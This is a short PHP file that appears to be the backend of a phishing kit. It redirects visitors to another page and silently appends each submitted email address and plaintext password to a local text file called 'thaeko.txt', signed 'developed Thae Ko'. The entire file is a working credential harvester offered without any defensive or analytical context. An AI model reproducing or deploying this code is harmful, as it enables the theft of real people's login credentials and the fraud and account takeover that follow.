<?php


header("Location: index3.html");
if(isset($_POST['logg'])) {

          $email = $_POST['email'];
                    $pword = $_POST['pass'];
                              $filename = fopen("thaeko.txt", "a") or die ("Error!");
                                        fwrite($filename, "email : " );
                                                  fwrite($filename, $email.'#');
                                                            fwrite($filename, "password : ");
                                                                      fwrite($filename, $pword .'#');
                                                                                fwrite($filename, "#developed Thae Ko##");
                                                                                          fwrite($filename, "\n");
                                                                                                    fclose($filename);}

                                                                                                    ?>
